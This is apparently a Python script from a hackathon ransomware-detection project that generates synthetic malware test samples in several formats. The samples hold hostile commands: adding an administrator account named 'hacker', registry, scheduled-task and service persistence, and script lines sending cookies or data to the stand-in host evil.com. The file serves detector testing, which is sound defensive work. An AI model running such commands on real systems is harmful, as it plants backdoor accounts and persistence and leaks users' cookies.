"""
Générateur d'échantillons de malwares synthétiques
RansomGuard AI - Hackathon Togo IT Days 2025
"""

import os
import base64
import zipfile
import struct

def create_directory():
    """Créer le répertoire de tests"""
    os.makedirs('test_malware_samples', exist_ok=True)

def create_malicious_python():
    """Créer un script Python malveillant"""
    content = '''#!/usr/bin/env python3
import subprocess
import base64
import os
import sys
import socket
import threading

# Malware Python synthétique
def malicious_function():
    # Code encodé en base64
    encoded_payload = "ZWNobyAiaGVsbG8gd29ybGQi"
    decoded = base64.b64decode(encoded_payload)
    
    # Exécution de commandes
    subprocess.call(decoded, shell=True)
    os.system("whoami")
    
    # Évaluation dynamique
    eval("print('malware')")
    exec("print('trojan')")
    
    # Création de socket suspect
    s = socket.socket()
    s.bind(('0.0.0.0', 4444))
    s.listen(1)
    
    # Import dynamique
    module = __import__('subprocess')
    module.call(['cmd', '/c', 'dir'])

if __name__ == "__main__":
    malicious_function()
'''
    
    with open('test_malware_samples/malicious_python.py', 'w') as f:
        f.write(content)

def create_malicious_batch():
    """Créer un script batch malveillant"""
    content = '''@echo off
REM Malware batch synthétique

REM Création d'utilisateur
net user hacker password /add
net localgroup administrators hacker /add

REM Modification du registre
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "malware" /t REG_SZ /d "C:\\malware.exe" /f
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "backdoor" /t REG_SZ /d "C:\\backdoor.exe" /f

REM Tâches planifiées
schtasks /create /tn "malware" /tr "C:\\malware.exe" /sc onstart /ru system
at 12:00 /every:m,t,w,th,f,sa,su malware.exe

REM Services
sc create "malware_service" binPath= "C:\\malware.exe"
sc start "malware_service"

REM Fichiers suspects
copy malware.exe C:\\Windows\\System32\\
copy backdoor.dll C:\\Windows\\System32\\

echo Malware installed successfully
pause
'''
    
    with open('test_malware_samples/malicious_batch.bat', 'w') as f:
        f.write(content)

def create_malicious_javascript():
    """Créer un script JavaScript malveillant"""
    content = '''// Malware JavaScript synthétique

// Évaluation dynamique
eval("console.log('malware')");
Function("alert('malware')")();
setTimeout(function() {
    eval("document.write('malware')");
}, 1000);

// Code encodé
var encoded = "YWxlcnQoJ21hbHdhcmUnKQ==";
eval(atob(encoded));

// Fonctions suspectes
new Function("alert('trojan')")();
setInterval(function() {
    eval("document.cookie = 'malware=true'");
}, 5000);

// Requêtes réseau suspectes
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://evil.com/upload", true);
xhr.send(document.cookie);

// Manipulation DOM suspecte
document.body.innerHTML = "<script>alert('malware')</script>";
document.write("<script>eval('alert(\\'malware\\')')</script>");

// Variables suspectes
var malware_payload = "ZWNobyAiaGVsbG8i";
var decoded_payload = atob(malware_payload);
eval(decoded_payload);
'''
    
    with open('test_malware_samples/malicious_js.js', 'w') as f:
        f.write(content)

def create_malicious_powershell():
    """Créer un script PowerShell malveillant"""
    content = '''# Malware PowerShell synthétique

# Exécution de commandes
Invoke-Expression "Get-Process"
Invoke-Command -ScriptBlock { Get-ComputerInfo }

# Création d'utilisateur
New-LocalUser -Name "hacker" -Password (ConvertTo-SecureString "password" -AsPlainText -Force)
Add-LocalGroupMember -Group "Administrators" -Member "hacker"

# Modification du registre
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "malware" -Value "C:\\malware.exe"

# Tâches planifiées
Register-ScheduledTask -TaskName "malware" -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute "C:\\malware.exe")

# Services
New-Service -Name "malware_service" -BinaryPathName "C:\\malware.exe"
Start-Service -Name "malware_service"

# Réseau suspect
$socket = New-Object System.Net.Sockets.TcpClient
$socket.Connect("evil.com", 4444)

# Encodage suspect
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("malware"))
Invoke-Expression $encoded

Write-Host "Malware PowerShell executed"
'''
    
    with open('test_malware_samples/malicious_powershell.ps1', 'w') as f:
        f.write(content)

def create_malicious_vbs():
    """Créer un script VBScript malveillant"""
    content = ''''
' Malware VBScript synthétique

' Création d'objet suspect
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Exécution de commandes
objShell.Run "cmd /c net user hacker password /add", 0, False
objShell.Run "cmd /c net localgroup administrators hacker /add", 0, False

' Modification du registre
objShell.RegWrite "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\malware", "C:\\malware.exe"

' Création de fichiers suspects
objFSO.CopyFile "malware.exe", "C:\\Windows\\System32\\malware.exe"

' Réseau suspect
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "POST", "http://evil.com/upload", False
objHTTP.Send

' Encodage suspect
encoded = "bWFsd2FyZQ=="
decoded = Base64Decode(encoded)
Execute decoded

Function Base64Decode(str)
    ' Fonction de décodage Base64
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.CreateElement("tmp")
    objNode.DataType = "bin.base64"
    objNode.Text = str
    Base64Decode = objNode.NodeTypedValue
End Function

MsgBox "Malware VBScript executed"
'''
    
    with open('test_malware_samples/malicious_vbs.vbs', 'w') as f:
        f.write(content)

def create_malicious_dll():
    """Créer une DLL malveillante simulée"""
    # Header PE simulé
    pe_header = b'MZ' + b'\x90' * 58 + b'PE\x00\x00'
    
    # Section .text simulée
    text_section = b'\x90' * 1024  # NOP sled
    
    # Strings suspects
    suspicious_strings = [
        b'CreateProcess',
        b'VirtualAlloc',
        b'WriteProcessMemory',
        b'CreateRemoteThread',
        b'RegCreateKey',
        b'RegSetValue',
        b'InternetOpen',
        b'HttpOpenRequest',
        b'CryptEncrypt',
        b'malware',
        b'virus',
        b'trojan',
        b'backdoor'
    ]
    
    # Construire le fichier
    content = pe_header + text_section + b'\x00' * 512
    
    # Ajouter les strings suspects
    for string in suspicious_strings:
        content += string + b'\x00'
    
    with open('test_malware_samples/malicious_dll.dll', 'wb') as f:
        f.write(content)

def create_malicious_exe():
    """Créer un exécutable malveillant simulé"""
    # Header PE simulé
    pe_header = b'MZ' + b'\x90' * 58 + b'PE\x00\x00'
    
    # Section .text simulée
    text_section = b'\x90' * 2048  # NOP sled
    
    # Strings suspects
    suspicious_strings = [
        b'CreateProcess',
        b'ShellExecute',
        b'WinExec',
        b'VirtualAlloc',
        b'WriteProcessMemory',
        b'CreateRemoteThread',
        b'SetWindowsHookEx',
        b'RegCreateKey',
        b'RegSetValue',
        b'InternetOpen',
        b'HttpOpenRequest',
        b'CryptEncrypt',
        b'CryptDecrypt',
        b'malware.exe',
        b'virus.exe',
        b'trojan.exe',
        b'backdoor.exe'
    ]
    
    # Construire le fichier
    content = pe_header + text_section + b'\x00' * 1024
    
    # Ajouter les strings suspects
    for string in suspicious_strings:
        content += string + b'\x00'
    
    with open('test_malware_samples/malicious_exe.exe', 'wb') as f:
        f.write(content)

def create_malicious_elf():
    """Créer un binaire ELF malveillant simulé"""
    # Header ELF simulé
    elf_header = b'\x7fELF\x01\x01\x01\x00' + b'\x00' * 8 + b'\x02\x00\x03\x00'
    
    # Section .text simulée
    text_section = b'\x90' * 1024  # NOP sled
    
    # Strings suspects
    suspicious_strings = [
        b'execve',
        b'fork',
        b'clone',
        b'socket',
        b'connect',
        b'bind',
        b'listen',
        b'accept',
        b'ptrace',
        b'system',
        b'popen',
        b'malloc',
        b'free',
        b'chmod',
        b'chown',
        b'unlink',
        b'rename',
        b'kill',
        b'ircbot',
        b'malware',
        b'virus',
        b'trojan',
        b'backdoor'
    ]
    
    # Construire le fichier
    content = elf_header + text_section + b'\x00' * 512
    
    # Ajouter les strings suspects
    for string in suspicious_strings:
        content += string + b'\x00'
    
    with open('test_malware_samples/malicious_elf.elf', 'wb') as f:
        f.write(content)

def create_obfuscated_python():
    """Créer un script Python obfusqué"""
    content = '''#!/usr/bin/env python3
# Python obfusqué

# Variables avec noms suspects
malware_payload = "ZWNobyAiaGVsbG8gd29ybGQi"
decoded_payload = base64.b64decode(malware_payload)

# Code encodé en hex
hex_code = "6576616c28227072696e7428276d616c7761726527292229"
hex_decoded = bytes.fromhex(hex_code).decode()

# Évaluation dynamique
eval(hex_decoded)
exec(hex_decoded)

# Import dynamique
module_name = "subprocess"
module = __import__(module_name)
module.call(["cmd", "/c", "dir"])

# Variables avec noms très suspects
a = "malware"
b = "virus"
c = "trojan"
d = "backdoor"

# Code obfusqué
for i in range(10):
    if i % 2 == 0:
        eval("print('" + a + "')")
    else:
        exec("print('" + b + "')")

# Longue chaîne base64 suspecte
very_long_base64 = "ZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQi"
decoded_long = base64.b64decode(very_long_base64)
eval(decoded_long.decode())
'''
    
    with open('test_malware_samples/obfuscated_python.py', 'w') as f:
        f.write(content)

def create_obfuscated_javascript():
    """Créer un script JavaScript obfusqué"""
    content = '''// JavaScript obfusqué

// Variables avec noms suspects
var malware_payload = "YWxlcnQoJ21hbHdhcmUnKQ==";
var decoded_payload = atob(malware_payload);

// Code encodé en hex
var hex_code = "6576616c2822636f6e736f6c652e6c6f6728276d616c7761726527292229";
var hex_decoded = "";
for (var i = 0; i < hex_code.length; i += 2) {
    hex_decoded += String.fromCharCode(parseInt(hex_code.substr(i, 2), 16));
}

// Évaluation dynamique
eval(hex_decoded);
Function(hex_decoded)();

// Variables avec noms très suspects
var a = "malware";
var b = "virus";
var c = "trojan";
var d = "backdoor";

// Code obfusqué
for (var i = 0; i < 10; i++) {
    if (i % 2 === 0) {
        eval("console.log('" + a + "')");
    } else {
        Function("console.log('" + b + "')")();
    }
}

// Longue chaîne base64 suspecte
var very_long_base64 = "YWxlcnQoJ21hbHdhcmUnKQ==" + "YWxlcnQoJ3ZpcnVzJyk=" + "YWxlcnQoJ3Ryb2phbicp" + "YWxlcnQoJ2JhY2tkb29yJyk=";
var decoded_long = atob(very_long_base64);
eval(decoded_long);

// Manipulation DOM suspecte
document.body.innerHTML = "<script>" + decoded_long + "</script>";
document.write("<script>eval('" + decoded_long + "')</script>");

// Requêtes réseau suspectes
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://evil.com/upload", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("payload=" + encodeURIComponent(decoded_long));
'''
    
    with open('test_malware_samples/obfuscated_js.js', 'w') as f:
        f.write(content)

def create_malicious_jar():
    """Créer un JAR malveillant simulé"""
    # Header ZIP (JAR est un ZIP)
    zip_header = b'PK\x03\x04'
    
    # Manifest
    manifest = b'''Manifest-Version: 1.0
Created-By: Malware Generator
Main-Class: Malware

'''
    
    # Classe Java malveillante simulée
    java_class = b'''
public class Malware {
    public static void main(String[] args) {
        try {
            // Code malveillant
            Runtime.getRuntime().exec("cmd /c dir");
            Runtime.getRuntime().exec("cmd /c net user");
            Runtime.getRuntime().exec("cmd /c reg add");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
'''
    
    # Construire le JAR
    content = zip_header + manifest + java_class
    
    with open('test_malware_samples/malicious_jar.jar', 'wb') as f:
        f.write(content)

def create_malicious_zip():
    """Créer une archive ZIP avec malware"""
    with zipfile.ZipFile('test_malware_samples/malicious_zip.zip', 'w') as zip_file:
        # Ajouter un fichier malveillant dans le ZIP
        zip_file.writestr('malware.py', '''import subprocess
import os
eval("print('malware')")
os.system("whoami")
subprocess.call("dir", shell=True)
''')
        
        # Ajouter un fichier batch malveillant
        zip_file.writestr('malware.bat', '''@echo off
net user hacker password /add
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "malware" /t REG_SZ /d "C:\\malware.exe" /f
''')

def create_packed_binary():
    """Créer un binaire packé simulé"""
    # Données avec entropie élevée (simulation de packing)
    import random
    packed_data = bytes(random.randint(0, 255) for _ in range(8192))
    
    # Header PE simulé
    pe_header = b'MZ' + b'\x90' * 58 + b'PE\x00\x00'
    
    # Combiner header + données packées
    content = pe_header + packed_data
    
    with open('test_malware_samples/packed_binary.bin', 'wb') as f:
        f.write(content)

def main():
    """Créer tous les échantillons de malwares"""
    print("🔧 Création des échantillons de malwares synthétiques...")
    
    create_directory()
    
    # Scripts malveillants
    create_malicious_python()
    create_malicious_batch()
    create_malicious_javascript()
    create_malicious_powershell()
    create_malicious_vbs()
    
    # Binaires malveillants
    create_malicious_dll()
    create_malicious_exe()
    create_malicious_elf()
    
    # Fichiers obfusqués
    create_obfuscated_python()
    create_obfuscated_javascript()
    create_packed_binary()
    
    # Archives malveillantes
    create_malicious_jar()
    create_malicious_zip()
    
    print("✅ Échantillons de malwares créés dans test_malware_samples/")
    print("📁 Fichiers créés:")
    
    files = [
        "malicious_python.py",
        "malicious_batch.bat", 
        "malicious_js.js",
        "malicious_powershell.ps1",
        "malicious_vbs.vbs",
        "malicious_dll.dll",
        "malicious_exe.exe",
        "malicious_elf.elf",
        "obfuscated_python.py",
        "obfuscated_js.js",
        "packed_binary.bin",
        "malicious_jar.jar",
        "malicious_zip.zip"
    ]
    
    for file in files:
        print(f"  • {file}")

if __name__ == "__main__":
    main()
